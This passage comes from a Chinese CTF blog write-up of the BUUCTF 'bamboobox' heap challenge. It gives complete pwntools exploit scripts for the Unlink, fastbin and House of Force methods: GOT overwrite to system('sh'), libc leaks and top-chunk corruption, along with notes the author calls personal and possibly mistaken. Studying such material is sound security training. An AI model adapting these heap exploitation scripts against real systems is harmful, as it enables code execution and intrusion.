&#x3D; leak_addr + libc.symbols[&#39;realloc&#39;]</span><br><span class="line">add(0x60,&#39;bbbb&#39;)</span><br><span class="line">delete(4)</span><br><span class="line">payload &#x3D; p64(mlk_addr - 0x23)</span><br><span class="line">edit(2,0x8,payload)</span><br><span class="line"></span><br><span class="line">add(0x60,&#39;cccc&#39;)</span><br><span class="line">payload &#x3D; &#39;a&#39;*(0x13 - 0x8)+ p64(one_gadget) + p64(realloc+16) -- 这里+8也可以通</span><br><span class="line">add(0x60,payload)</span><br><span class="line">#add(0x18,&#39;dddd&#39;)</span><br><span class="line">p.sendlineafter(&#39;choice:&#39;,&#39;2&#39;)</span><br><span class="line">p.sendlineafter(&#39;name:&#39;,str(0x10))</span><br><span class="line">#gdb.attach(p)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>为什么这里又改成了delete(2)，而且有时候说free()又有时候说delete(),别问问就是<strong>防伪码</strong></p>
<h2 id="法二：Unlink"><a href="#法二：Unlink" class="headerlink" title="法二：Unlink"></a>法二：Unlink</h2><p>首先遗憾的表示Unlink我还是不能完全解读，但我只知道套模板利用</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">首先伪造一个fake chunk，然后修改fake chunk下一个chunk的prev_size位为0，使得系统误以为我们的fake chunk为空</span><br><span class="line">并且填充fake chunk 的fd&#x3D;&#x3D;ptr-0x18 bk&#x3D;&#x3D;ptr-0x10,此时我们free下一个chunk，会触发向前合并--&gt;触发unlink</span><br><span class="line">那么我们下次add()的堆块就会出现在prt-0x18的位置				--纯属个人理解，如有错误希望大家纠正</span><br></pre></td></tr></table></figure>

<p>那么我们为什么可以利用unlink呢？</p>
<p>因为我们的堆块是通过一张表格来操控的，也就是我们fastbin方法中出现过的 0x6020c8，那么我们如果我们利用unlink将这些表的内容地址修改为got表的地址，那么我们edit的时候是否就是在修改got表呢？   </p>
<p>于是乎我总结了使用Unlink的两点前提：</p>
<p>1.一般用在不开启pie保护的情况下，因为只有这样才能修改got表   –这条不一定正确</p>
<p>2.非常适合用在用一张表来控制堆块的情况下，因为只要是用表来控制就有一个固定的表头，那么我们设置表头为ptr一改一个准 –我觉得没毛病</p>
<p>那么我们先放exp再打磨细节</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">p &#x3D; process(&#39;bamboobox&#39;)</span><br><span class="line">elf &#x3D; ELF(&#39;bamboobox&#39;)</span><br><span class="line">context.log_level &#x3D; &#39;debug&#39;</span><br><span class="line">#p &#x3D; remote(&#39;node4.buuoj.cn&#39;,27105)</span><br><span class="line">libc &#x3D; ELF(&#39;libc-2.23-64.so&#39;)</span><br><span class="line">def add(size,content):</span><br><span class="line">	p.sendlineafter(&#39;Your choice:&#39;,&#39;2&#39;)</span><br><span class="line">	p.sendlineafter(&#39;Please enter the length of item name:&#39;,str(size))</span><br><span class="line">	p.sendlineafter(&#39;Please enter the name of item:&#39;,str(content))</span><br><span class="line">def show():</span><br><span class="line">	p.sendlineafter(&#39;Your choice:&#39;,&#39;1&#39;)</span><br><span class="line">#p.sendlineafter(&#39;Please enter the index of item:&#39;,str(index))</span><br><span class="line">def edit(index,size,content):</span><br><span class="line">	p.sendlineafter(&#39;Your choice:&#39;,&#39;3&#39;)</span><br><span class="line">	p.sendlineafter(&#39;Please enter the index of item:&#39;,str(index))</span><br><span class="line">	p.sendlineafter(&#39;Please enter the length of item name:&#39;,str(size))</span><br><span class="line">	p.sendlineafter(&#39;Please enter the new name of the item:&#39;,str(content))</span><br><span class="line">def delete(index):</span><br><span class="line">	p.sendlineafter(&#39;Your choice:&#39;,&#39;4&#39;)</span><br><span class="line">p.sendlineafter(&#39;Please enter the index of item:&#39;,str(index))</span><br><span class="line"></span><br><span class="line">ptr &#x3D; 0x6020c8</span><br><span class="line"></span><br><span class="line">add(0x40,&#39;2222&#39;)</span><br><span class="line">add(0x80,&#39;3333&#39;)</span><br><span class="line">add(0x20,&#39;4444&#39;)</span><br><span class="line">payload &#x3D; p64(0) + p64(0x41) + p64(ptr - 0x18) + p64(ptr - 0x10) + p64(1)*4  + p64(0x40) + p64(0x90)</span><br><span class="line">edit(0,0x50,payload)</span><br><span class="line">delete(1)</span><br><span class="line"></span><br><span class="line">atoi_got &#x3D; elf.got[&#39;atoi&#39;]</span><br><span class="line">free_got &#x3D; elf.got[&#39;free&#39;]</span><br><span class="line">#show()</span><br><span class="line">payload &#x3D; p64(0) * 2 + p64(0x40)+ p64(atoi_got) </span><br><span class="line">edit(0,0x20,payload)</span><br><span class="line">show()</span><br><span class="line"></span><br><span class="line">p.recvuntil(&#39;0 : &#39;)</span><br><span class="line">leak_addr &#x3D; u64(p.recv(6).ljust(8,&#39;\x00&#39;)) </span><br><span class="line"></span><br><span class="line">print hex(leak_addr)</span><br><span class="line">libc_base &#x3D; leak_addr - libc.symbols[&#39;atoi&#39;]</span><br><span class="line">system_addr &#x3D; libc_base + libc.symbols[&#39;system&#39;]</span><br><span class="line">print hex(system_addr)</span><br><span class="line"></span><br><span class="line">edit(0,0x8,p64(system_addr))</span><br><span class="line"></span><br><span class="line">p.recvuntil(&#39;:&#39;)</span><br><span class="line">p.sendline(&#39;sh&#39;)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="打磨细节"><a href="#打磨细节" class="headerlink" title="打磨细节"></a>打磨细节</h3><p>首先我们要如何利用unlink</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Unlink的最后效果是将ptr的指针指向ptr-0x18，也就是说如果我们使用0x6020c8作为ptr</span><br></pre></td></tr></table></figure>

<img src="/2021/09/26/BUU-hitcontraining-bamboobox/09/26/BUU-hitcontraining-bamboobox/image-20210926200615121.png" class title="image-20210926200615121">

<p>我们从IDA里面看到，add的循环初始值为0，也就是说下标为0的chunk对应的表地址就是0x6020c8</p>
<p><img src="https://github.com/xuxiaoyu233/xuxiaoyu233.github.io/blob/picture/BUU-hitcontraining-bamboobox/image-20210926200722365.png?raw=true" alt="image-20210926200722365.png"></p>
<p>那么我们如果使用unlik对0x6020c8使用的话，那么chunk0对应的指针就会从0x6020c8-0x18开始，此时当我们用edit对chunk0进行修改时就相当于修改这一个控制堆块的表，并且我们如果将got表的内容覆盖这些表中存储内容的地址时，修改堆块的内容就相当于修改got表</p>
<p>注意的是我们Unlink最后的效果是使得指针变化，而不是指针重置，也就是说当我们想利用这个写入的时候，使用的是edit功能来进行，而不是重新add一个内容</p>
<p>其实Unlink很多都是类似的只需要记住</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">将fake chunk的fd,bk分别修改为(ptr-0x18)，(ptr-0x10).并且使得下一个堆块（不属于fastbin，因为fastbin的prev_size位不能为0）的prev_size内容置为0，然后free后面的chunk就可以使得指针从ptr---&gt;&gt;prt-0x18，此时edit就可以达到修改的目的了</span><br></pre></td></tr></table></figure>

<h3 id="法三：House-of-Force"><a href="#法三：House-of-Force" class="headerlink" title="法三：House of Force"></a>法三：House of Force</h3><p>总结下大致需要的条件：</p>
<p>1.我觉得需要一个后门函数，不然只是达到了修改的目的，并不能泄露地址</p>
<p>2.要存在溢出漏洞，至少要溢出到top chunk的前八字节</p>
<p>原理：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">简单的来说，但我们修改top chunk为一个很大的数的时候（一般设置为0xffffffff&#x3D;&#x3D;-1），这时候如果我们再add新的堆块时就需要从libc中找空间，我们通过特定的手法就可以将我们申请的空间设置为我们要修改的地方  			--纯属个人理解，请大家批评指正</span><br></pre></td></tr></table></figure>

<p>推荐链接：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/luoleqi/p/12367365.html">hitcontraining_bamboobox 堆技巧 House of Force - PwnKi - 博客园 (cnblogs.com)</a></p>
<h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">p &#x3D; process(&#39;bamboobox&#39;)</span><br><span class="line">elf &#x3D; ELF(&#39;bamboobox&#39;)</span><br><span class="line">context.log_level &#x3D; &#39;debug&#39;</span><br><span class="line">#p &#x3D; remote(&#39;node4.buuoj.cn&#39;,26762)</span><br><span class="line">libc &#x3D; ELF(&#39;libc-2.23-64.so&#39;)</span><br><span class="line">def add(size,content):</span><br><span class="line">	p.sendlineafter(&#39;Your choice:&#39;,&#39;2&#39;)</span><br><span class="line">	p.sendlineafter(&#39;Please enter the length of item name:&#39;,str(size))</span><br><span class="line">	p.sendlineafter(&#39;Please enter the name of item:&#39;,str(content))</span><br><span class="line">def show():</span><br><span class="line">	p.sendlineafter(&#39;Your choice:&#39;,&#39;1&#39;)</span><br><span class="line">#p.sendlineafter(&#39;Please enter the index of item:&#39;,str(index))</span><br><span class="line">def edit(index,size,content):</span><br><span class="line">	p.sendlineafter(&#39;Your choice:&#39;,&#39;3&#39;)</span><br><span class="line">	p.sendlineafter(&#39;Please enter the index of item:&#39;,str(index))</span><br><span class="line">	p.sendlineafter(&#39;Please enter the length of item name:&#39;,str(size))</span><br><span class="line">	p.sendlineafter(&#39;Please enter the new name of the item:&#39;,str(content))</span><br><span class="line">def delete(index):</span><br><span class="line">	p.sendlineafter(&#39;Your choice:&#39;,&#39;4&#39;)</span><br><span class="line">	p.sendlineafter(&#39;Please enter the index of item:&#39;,str(index))</span><br><span class="line">#ptr &#x3D; 0x6020c8</span><br><span class="line">magic &#x3D; 0x400d49</span><br><span class="line">add(0x30,&#39;1111&#39;)</span><br><span class="line">payload &#x3D; &#39;a&#39;*0x38 + p64(0xffffffffffffffff)</span><br><span class="line">edit(0,0x41,payload)</span><br><span class="line">offset &#x3D; -(0x20+0x40+0x8+0xf)</span><br><span class="line">add(offset,&#39;aaaa&#39;)</span><br><span class="line">add(0x10,p64(magic)*2)</span><br><span class="line">gdb.attach(p)</span><br><span class="line">#p.sendlineafter(&#39;Your choice:&#39;,&#39;5&#39;)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p><img src="https://github.com/xuxiaoyu233/xuxiaoyu233.github.io/blob/picture/BUU-hitcontraining-bamboobox/image-20210927193701973.png?raw=true" alt="image-20210927193701973.png"></p>
<p>发现虽然修改成功，但远程并不能出flag，可能是该目录下没有对应的文件==坑人</p>
</div><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">Author: </span><span class="post-copyright-info"><a href="mailto:undefined">墨水彩笔</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">Link: </span><span class="post-copyright-info"><a href="http://example.com/2021/09/26/BUU-hitcontraining-bamboobox/">http://example.com/2021/09/26/BUU-hitcontraining-bamboobox/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"></div><div class="post_share"><div class="social-share" data-image="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2021/10/16/%E2%80%9C%E9%B2%B2%E9%B9%8F%E6%9D%AF%E2%80%9D/"><img class="prev-cover" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" onerror="onerror=null;src='/img/404.jpg'"><div class="pagination-info"><div class="label">Previous Post</div><div class="prev_info">“鲲鹏杯”</div></div></a></div><div class="next-post pull-right"><a href="/2021/09/24/buu-hacknote/"><img class="next-cover" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" onerror="onerror=null;src='/img/404.jpg'"><div class="pagination-info"><div class="label">Next Post</div><div class="next_info">buu-hacknote</div></div></a></div></nav></article></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2022 By 墨水彩笔</div><div class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><section id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Read Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Switch Between Light And Dark Mode"><i class="fas fa-adjust"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="Setting"><i class="fas fa-cog"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table Of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back To Top"><i class="fas fa-arrow-up"></i></button></div></section><div><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><div class="js-pjax"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></div></body></html>